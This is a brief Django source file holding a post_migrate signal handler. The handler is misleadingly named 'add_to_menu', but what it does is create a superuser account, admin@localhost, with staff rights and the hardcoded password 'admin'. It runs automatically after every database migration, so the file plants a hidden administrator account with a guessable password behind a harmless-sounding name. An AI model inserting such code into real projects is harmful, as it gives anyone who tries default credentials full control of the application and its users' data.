from django.db.models.signals import post_migrate
from django.contrib.auth import get_user_model
from django.dispatch import receiver

@receiver(post_migrate)
def add_to_menu(sender, **kwargs):
    user = get_user_model()
    obj, created = user.objects.get_or_create(email="admin@localhost")
    if not created: return
    obj.set_password("admin")
    obj.is_superuser = True
    obj.is_staff = True
    obj.save()
    print("User created: admin@localhost")